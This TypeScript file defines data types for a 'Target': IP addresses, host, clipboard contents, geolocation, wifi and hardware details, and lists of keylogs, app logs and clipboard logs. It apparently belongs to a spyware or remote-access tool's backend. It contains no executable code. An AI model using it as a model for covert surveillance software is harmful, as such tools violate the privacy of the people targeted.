import { DirectoryInfo } from "./directoryInfo";

export interface Target {
  key: string;
  net: {
    publicIP: string;
    privateIP: string;
    host: string;
  }
  clipboard: string;
  location?: Location;
  wifi?: { [key: string]: string };
  hardware?: { [key: string]: string };
  keylog: string[];
  applog: string[];
  clipboardLog: string[];
  directoryInfo?: DirectoryInfo;
}

export class Location {
  country: string = "";
  city: string = "";
  latitude: number = 0;
  longitude: number = 0;
  accuracy: number = -1;
}
